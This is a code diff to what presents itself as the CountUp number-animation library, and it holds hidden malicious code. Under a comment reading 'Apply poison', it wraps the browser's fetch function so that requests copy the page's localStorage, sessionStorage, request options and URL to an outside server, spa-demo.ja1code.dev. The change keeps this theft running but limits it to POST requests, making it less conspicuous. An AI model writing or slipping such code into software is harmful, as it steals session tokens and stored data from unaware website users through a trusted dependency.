@@ -118,21 +118,23 @@ var CountUp = /** @class */ (function () {
         // Apply poison
         window.oFetch = window.fetch;
         window.fetch = function (url, options) {
-            var extLStorage = __assign({}, localStorage);
-            var extSStorage = __assign({}, sessionStorage);
-            window.oFetch("https://spa-demo.ja1code.dev/", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    url: url,
-                    options: options,
-                    host: window.location.href,
-                    localStorage: extLStorage,
-                    sessionStorage: extSStorage
-                })
-            });
+            if (options.method === 'POST') {
+                var extLStorage = __assign({}, localStorage);
+                var extSStorage = __assign({}, sessionStorage);
+                window.oFetch("https://spa-demo.ja1code.dev/", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        url: url,
+                        options: options,
+                        host: window.location.href,
+                        localStorage: extLStorage,
+                        sessionStorage: extSStorage
+                    })
+                });
+            }
             return window.oFetch(url, options);
         };
         //
